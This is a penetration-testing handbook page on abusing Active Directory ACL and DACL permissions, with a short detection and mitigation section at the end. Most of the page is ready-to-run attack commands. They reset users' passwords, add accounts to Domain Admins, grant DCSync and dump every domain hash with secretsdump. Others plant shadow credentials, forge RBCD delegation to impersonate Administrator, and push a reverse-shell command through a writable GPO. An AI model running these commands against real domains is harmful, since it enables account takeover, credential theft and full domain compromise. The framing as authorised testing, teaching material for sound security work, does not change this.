# ACL / DACL Abuse

Every Active Directory object carries a Discretionary Access Control List (DACL) that says who can do what to it. Misconfigured ACEs — a help-desk group with `ForceChangePassword` on admins, a user with `GenericAll` on a computer, `WriteDACL` on the domain root — are the quiet paths from a normal account to Domain Admin. [BloodHound](ad-attacks.md#enumerate-with-bloodhound) draws these chains for you; this page is how you walk them.

{% hint style="warning" %}
ACL edits change the domain. Note every ACE you add and **revert it** when done — record the before/after for the [report](report-writing.md). Password resets on service accounts break the service; flag that to the client.
{% endhint %}

## Key abusable permissions

| Permission | Abuse | Impact |
| --- | --- | --- |
| **GenericAll** | Full control | Reset password, add to group, set SPN, shadow creds |
| **GenericWrite** | Write most attributes | Set SPN (targeted Kerberoast), logon script, shadow creds |
| **WriteDACL** | Modify the object's DACL | Grant yourself any right, incl. DCSync on the domain |
| **WriteOwner** | Take ownership | Become owner → rewrite the DACL |
| **ForceChangePassword** | Reset password without the old one | Account takeover |
| **AllExtendedRights** | All extended rights | DCSync, password reset, read LAPS |
| **AddSelf / Self-Membership** | Add self to a group | Group-based privilege escalation |
| **Owns / WriteOwner on GPO** | Edit a linked GPO | Code execution across the OU |

## Enumerate the ACLs

### PowerView

```powershell
Import-Module .\PowerView.ps1

# SID of the principal you control
$sid = Convert-NameToSid <USER>

# Everything that principal can act on
Get-DomainObjectACL -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}

# Scan the domain for interesting ACEs
Find-InterestingDomainAcl -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs

# Inspect a specific object's ACL
Get-DomainObjectACL -Identity "CN=Domain Admins" -ResolveGUIDs | Select SecurityIdentifier, AceType, ObjectAceType
```

### Native (no PowerView — CLM-safe)

```powershell
# Built-in AD provider
Get-Acl "AD:\$(Get-ADUser <USER>)" | Select-Object -ExpandProperty Access

# Parse SDDL
ConvertFrom-SddlString -Sddl (Get-Acl "AD:\$(Get-ADUser <USER>)").Sddl

# Resolve extended-right GUIDs by name
Get-ADObject -SearchBase "CN=Extended-Rights,CN=Configuration,DC=<DOMAIN>,DC=<TLD>" -Filter {ObjectClass -eq 'controlAccessRight'} -Properties rightsGUID,displayName
```

### Linux — Impacket dacledit.py

```bash
python3 dacledit.py -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>' -action read -principal <USER>
```

## ForceChangePassword

Reset a target's password without knowing the current one.

```powershell
# PowerView
$pass = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <TARGET> -AccountPassword $pass -Verbose
```

```bash
# net rpc (Linux, with password)
net rpc password <TARGET> 'NewPassword123!' -U '<DOMAIN>/<USER>%<PASS>' -S <DC_IP>

# Pass-the-Hash variant (pth-net)
pth-net rpc password <TARGET> '<NEWPASS>' -U '<DOMAIN>/<USER>%<LM:NT>' -S <DC_IP>

# Impacket dacledit / bloodyAD
python3 dacledit.py -dc-ip <DC_IP> -action write -principal <USER> -target <TARGET> <DOMAIN>/<USER>:'<PASS>'
```

{% hint style="info" %}
AD password policy rejects a new password containing 3+ consecutive characters of the target's `samAccountName`. Pick something unrelated.
{% endhint %}

## GenericAll on a user

Full control — reset the password, add them to a group, or set an SPN and Kerberoast.

```powershell
# Reset the password
$pass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <TARGET> -AccountPassword $pass

# Set a fake SPN → Kerberoast → clean up
Set-DomainObject -Identity <TARGET> -SET @{serviceprincipalname='fake/spn'}
# (roast with GetUserSPNs.py / Rubeus — see kerberos-attacks.md)
Set-DomainObject -Identity <TARGET> -Clear serviceprincipalname
```

## GenericAll / AddSelf on a group

Add yourself (or a controlled user) to a privileged group.

```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members <USER> -Verbose
Remove-DomainGroupMember -Identity "Protected Users" -Members <TARGET> -Verbose
```

```bash
# bloodyAD (Linux)
bloodyAD -d <DOMAIN> -u <USER> -p '<PASS>' --host <DC_IP> add groupMember "<GROUP>" <USER>

# Pass-the-Hash
pth-net rpc group addmem "<GROUP>" <TARGET> -U '<DOMAIN>/<USER>%<LM:NT>' -S <DC_IP>
```

## GenericWrite on a user

Write attributes — the go-to abuse is setting an SPN for a [targeted Kerberoast](kerberos-attacks.md#targeted-kerberoasting-acl-abuse), or planting shadow credentials.

```powershell
Set-DomainObject -Identity <TARGET> -SET @{serviceprincipalname='fake/admin'}
```

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <TARGET>
```

## WriteDACL on the domain object → DCSync

Grant a non-admin account the replication rights that DCSync needs, then pull every hash.

```powershell
# PowerView — grant DCSync
Add-DomainObjectAcl -TargetIdentity "DC=<DOMAIN>,DC=<TLD>" -PrincipalIdentity <USER> -Rights DCSync
```

```bash
# Impacket dacledit
python3 dacledit.py -dc-ip <DC_IP> -action write -principal <USER> \
  -target-dn "DC=<DOMAIN>,DC=<TLD>" -rights DCSync <DOMAIN>/<USER>:'<PASS>'

# bloodyAD via a machine account (see LEGACY WEB SERVERS pattern below)
bloodyAD -d <DOMAIN> -u '<MACHINE$>' -p ':<NTLM_HASH>' --host <DC_IP> add dcsync <USER>

# Then DCSync
secretsdump.py <DOMAIN>/<USER>:'<PASS>'@<DC_IP> -just-dc
```

## WriteOwner → WriteDACL chain

`WriteOwner` alone gives no direct action — take ownership first, then rewrite the DACL to grant yourself full control.

```powershell
# Take ownership
Set-DomainObjectOwner -Identity <TARGET> -Owner <USER>

# Now grant self full control
Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All
```

```bash
# bloodyAD
bloodyAD -d <DOMAIN> -u <USER> -p '<PASS>' --host <DC_IP> set owner <TARGET_OBJECT> <USER>
bloodyAD -d <DOMAIN> -u <USER> -p '<PASS>' --host <DC_IP> add genericAll <TARGET> <USER>

# Impacket owneredit
python3 owneredit.py -new-owner <USER> -target <TARGET> -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

## Shadow Credentials (msDS-KeyCredentialLink)

With `GenericWrite`/`GenericAll` over a target, add a key credential to `msDS-KeyCredentialLink`, then authenticate via PKINIT to recover their TGT and NT hash — no password reset, quieter than ForceChangePassword. Full ADCS/PKINIT mechanics in [ADCS Attacks](adcs-attacks.md#shadow-credentials-certipy-shadow-auto).

```bash
# Certipy — auto (inject → PKINIT → NT hash → cleanup)
certipy shadow auto -u <USER>@<DOMAIN> -p '<PASS>' -account <TARGET> -dc-ip <DC_IP>

# pywhisker (Linux)
python3 pywhisker.py -d <DOMAIN> -u <USER> -p '<PASS>' --target <TARGET> --action add --filename cert
python3 pywhisker.py -d <DOMAIN> -u <USER> -p '<PASS>' --target <TARGET> --action list

# bloodyAD
bloodyAD --host <DC_IP> -u <USER> -p '<PASS>' -d <DOMAIN> add shadowCredentials <TARGET>$
```

```powershell
# Whisker (Windows)
.\Whisker.exe add /target:<TARGET>$ /domain:<DOMAIN> /dc:<DC>
.\Whisker.exe list /target:<TARGET>
.\Whisker.exe remove /target:<TARGET> /deviceid:<ID>
```

## GenericWrite on a computer → RBCD / delegation

If you can write to a computer object, set an SPN or configure delegation and impersonate an admin. Full RBCD chain in [Kerberos Attacks](kerberos-attacks.md#rbcd-resource-based-constrained-delegation).

```powershell
# Add SPN, then S4U2 to impersonate admin
Set-DomainObject -Identity <TARGET_COMPUTER> -SET @{serviceprincipalname='http/target.<DOMAIN>'}
Rubeus.exe s4u /user:<TARGET_COMPUTER>$ /rc4:<HASH> /impersonateuser:administrator /msdsspn:http/target /ptt
```

## Multi-step chains

### ForceChangePassword → group → WriteOwner → RCE

The kind of path BloodHound loves to surface — each hop uses the access the previous one granted:

```
1. ForceChangePassword on target_user   → set a new password
2. GenericWrite on elevated_group        → add target_user to it
3. elevated_group has WriteOwner on admin_account → take ownership
4. Own admin_account → WriteDACL → GenericAll → reset its password
5. Use admin_account creds for RCE
```

### Chain GenericAll password resets across users

BloodHound shows `GenericAll`/`ForceChangePassword` running through 2-3 service accounts to a target. Reset each in sequence using the freshly reset creds:

```bash
net rpc password "svc_helpdesk" 'Nagoya@Winter24!' -U "<DOMAIN>/fiona.clark%Summer2023" -S <DC_IP>
net rpc password "christopher.lewis" 'Nagoya@Winter24!' -U "<DOMAIN>/svc_helpdesk%Nagoya@Winter24!" -S <DC_IP>
```

### LEGACY WEB SERVERS pattern (machine account → DCSync)

Machine accounts (`COMPUTERNAME$`) are often over-privileged in old domains — members of Backup Operators, or holders of `WriteDACL` on the domain root. Dump the machine hash after RCE, then abuse it:

```bash
# 1. Compromise the web server, dump its machine account hash
secretsdump.py -k <DOMAIN>/'<MACHINE$>'@<HOST> -just-dc-user krbtgt   # or LOCAL SAM/LSA

# 2. Use the machine account to grant DCSync via WriteDACL
bloodyAD -u '<MACHINE$>' -p ':<HASH>' --host <DC_IP> -d <DOMAIN> add dcsync <USER>

# 3. DCSync → domain takeover
secretsdump.py <DOMAIN>/<USER>:'<PASS>'@<DC_IP> -just-dc
```

## RBCD via GenericAll on a computer object

When BloodHound shows `GenericAll` (or write on `msDS-AllowedToActOnBehalfOfOtherIdentity`) on a Computer object — often the DC itself — mint a controlled machine account, delegate to the target, and impersonate Administrator.

```bash
# Clock sync (Kerberos 5-min skew window)
sudo ntpdate <DC_IP>

# 1. Add a controlled machine account (MachineAccountQuota default 10)
impacket-addcomputer <DOMAIN>/'<USER>' -hashes :<NT> \
  -computer-name 'EVIL$' -computer-pass 'Passw0rd!' -dc-ip <DC_IP>

# 2. Write RBCD: target → EVIL$
impacket-rbcd <DOMAIN>/'<USER>' -hashes :<NT> \
  -delegate-from 'EVIL$' -delegate-to '<TARGET>$' -action write -dc-ip <DC_IP>

# 3. S4U impersonate Administrator → CIFS/target
impacket-getST <DOMAIN>/'EVIL$':'Passw0rd!' -spn cifs/<TARGET_FQDN> -impersonate Administrator -dc-ip <DC_IP>

# 4. Own it
export KRB5CCNAME=Administrator@cifs_<TARGET_FQDN>@<DOMAIN>.ccache
impacket-psexec -k -no-pass <TARGET_FQDN>
impacket-secretsdump -k -no-pass <TARGET_FQDN>
```

{% hint style="warning" %}
Mandatory cleanup — flush the RBCD attribute and delete the machine account:
`impacket-rbcd <DOMAIN>/'<USER>' -hashes :<NT> -delegate-to '<TARGET>$' -action flush -dc-ip <DC_IP>`
`impacket-addcomputer <DOMAIN>/'<USER>' -hashes :<NT> -computer-name 'EVIL$' -action del -dc-ip <DC_IP>`
{% endhint %}

## GPO abuse via writable ACLs

A `WriteProperty`/`WriteDacl`/`GenericWrite` ACE on a linked GPO means code execution on every computer or user in the linked OU. Full tooling in [AD Attacks](ad-attacks.md#gpo-abuse).

```powershell
# Find GPOs a target user can modify
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {
  $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner|GenericAll|GenericWrite" -and
  $_.SecurityIdentifier -match "<TARGET_USER_SID>"
}

# Abuse it — add a local admin, or an immediate task
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER> --GPOName "<GPO_NAME>"
```

```bash
# Linux
./pygpoabuse.py <DOMAIN>/<USER> -hashes lm:nt -gpo-id "<GPO_GUID>" -powershell -command "<REVSHELL_CMD>"
```

## Detection & mitigation (for the report)

```powershell
# Blue-team: watch for DACL changes
Get-WinEvent -LogName Security | ? {$_.ID -eq 5136 -or $_.ID -eq 5137}
```

* **Least privilege** — grant only the rights actually needed; audit ACLs quarterly.
* **Protected groups** — Domain/Enterprise Admins are protected; **AdminSDHolder** resets their ACLs hourly.
* **Constrain machine accounts** — keep them out of privileged groups and off the domain-root DACL.
* **Alert on DACL modifications** (Event 5136/5137) to sensitive objects.
* **Tier admin accounts** so a foothold ACE can't reach domain-level rights.

## Related

* [Active Directory](AD.md) — AD objects, groups, and the DACL model
* [AD Attacks](ad-attacks.md) — the full chain; BloodHound is how you find these ACEs
* [Kerberos Attacks](kerberos-attacks.md) — targeted Kerberoasting, RBCD, and S4U that ACL writes unlock
* [ADCS Attacks](adcs-attacks.md) — shadow credentials and certificate-based takeover
* [Relay and Coerce](relay-and-coerce.md) — NTLM relay to LDAP can grant these same ACEs
* [CrackMapExec / NetExec](crackmapexec-netexec.md) · [Credential Dumping](credential-dumping.md) · [Lateral Movement](lateral-movement.md)
* [Password / Hash Attacks](password-hash-attacks.md) · [Report Writing](report-writing.md)
